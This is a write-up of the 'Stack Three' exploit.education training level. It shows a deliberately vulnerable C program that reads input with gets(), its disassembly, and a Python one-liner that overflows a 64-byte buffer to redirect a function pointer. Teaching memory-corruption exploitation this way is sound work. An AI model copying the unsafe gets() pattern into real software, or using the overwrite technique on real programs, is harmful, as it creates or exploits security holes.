# Stack Three

## Code

```c
#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

char *gets(char *);

void complete_level() {
  printf("Congratulations, you've finished " LEVELNAME " :-) Well done!\n");
  exit(0);
}

int main(int argc, char **argv) {
  struct {
    char buffer[64];
    volatile int (*fp)();
  } locals;

  printf("%s\n", BANNER);

  locals.fp = NULL;
  gets(locals.buffer);

  if (locals.fp) {
    printf("calling function pointer @ %p\n", locals.fp);
    fflush(stdout);
    locals.fp();
  } else {
    printf("function pointer remains unmodified :~( better luck next time!\n");
  }

  exit(0);
}

```


## Explanation


In this level we're meant to redirect control flow to the function `complete_level()`, via altering the *function `fp` in the struct `locals`.

To achieve this we should know that the a function lives inside the binary's memory, and due to the lack of ASLR we can, with either `objdump`
or `gdb` get the symbols of the binary and the address of the function we are seeking

with objdump:

`objdump -d ./stack-three`

should output something like:

```asm
...

08048535 <complete_level>:
 8048535:       55                      push   %ebp
 8048536:       89 e5                   mov    %esp,%ebp
 8048538:       83 ec 08                sub    $0x8,%esp
 804853b:       83 ec 0c                sub    $0xc,%esp
 804853e:       68 20 86 04 08          push   $0x8048620
 8048543:       e8 18 fe ff ff          call   8048360 <puts@plt>
 8048548:       83 c4 10                add    $0x10,%esp
 804854b:       83 ec 0c                sub    $0xc,%esp
 804854e:       6a 00                   push   $0x0
 8048550:       e8 2b fe ff ff          call   8048380 <exit@plt>

08048555 <main>:
 8048555:       8d 4c 24 04             lea    0x4(%esp),%ecx
 8048559:       83 e4 f0                and    $0xfffffff0,%esp
 804855c:       ff 71 fc                pushl  -0x4(%ecx)
 804855f:       55                      push   %ebp
 8048560:       89 e5                   mov    %esp,%ebp
 8048562:       51                      push   %ecx
 8048563:       83 ec 54                sub    $0x54,%esp
 8048566:       83 ec 0c                sub    $0xc,%esp
 8048569:       68 64 86 04 08          push   $0x8048664
 804856e:       e8 ed fd ff ff          call   8048360 <puts@plt>
 8048573:       83 c4 10                add    $0x10,%esp
 8048576:       c7 45 f4 00 00 00 00    movl   $0x0,-0xc(%ebp)
 804857d:       83 ec 0c                sub    $0xc,%esp
 8048580:       8d 45 b4                lea    -0x4c(%ebp),%eax
 8048583:       50                      push   %eax
 8048584:       e8 c7 fd ff ff          call   8048350 <gets@plt>
 8048589:       83 c4 10                add    $0x10,%esp
 804858c:       8b 45 f4                mov    -0xc(%ebp),%eax
 804858f:       85 c0                   test   %eax,%eax
 8048591:       74 2c                   je     80485bf <main+0x6a>
 8048593:       8b 45 f4                mov    -0xc(%ebp),%eax
 8048596:       83 ec 08                sub    $0x8,%esp
 8048599:       50                      push   %eax
 804859a:       68 b0 86 04 08          push   $0x80486b0
 804859f:       e8 9c fd ff ff          call   8048340 <printf@plt>
 80485a4:       83 c4 10                add    $0x10,%esp
 80485a7:       a1 a4 98 04 08          mov    0x80498a4,%eax
 80485ac:       83 ec 0c                sub    $0xc,%esp
 80485af:       50                      push   %eax
 80485b0:       e8 bb fd ff ff          call   8048370 <fflush@plt>
 80485b5:       83 c4 10                add    $0x10,%esp
 80485b8:       8b 45 f4                mov    -0xc(%ebp),%eax
 80485bb:       ff d0                   call   *%eax
 80485bd:       eb 10                   jmp    80485cf <main+0x7a>
 80485bf:       83 ec 0c                sub    $0xc,%esp
 80485c2:       68 d0 86 04 08          push   $0x80486d0
 80485c7:       e8 94 fd ff ff          call   8048360 <puts@plt>
 80485cc:       83 c4 10                add    $0x10,%esp
 80485cf:       83 ec 0c                sub    $0xc,%esp
 80485d2:       6a 00                   push   $0x0
 80485d4:       e8 a7 fd ff ff          call   8048380 <exit@plt>
 80485d9:       66 90                   xchg   %ax,%ax
 80485db:       66 90                   xchg   %ax,%ax
 80485dd:       66 90                   xchg   %ax,%ax
 80485df:       90                      nop
...
```
## Solution

Here, and in the source code we see that it's needed to modify `*(fp)()` to the address `0x08048535`. This, likewise, should be achieved 
via exploiting the insecure `gets` function, passing to the STDIN a padding of 64 characters into the buffer, and overriding the struct's next
field, fp, with the address of the target function. To do this, after figuring out the address, we can create the following script

`python -c "import struct; print('A'*64 + struct.pack('<I',0x08048535))" | ./stack-three`
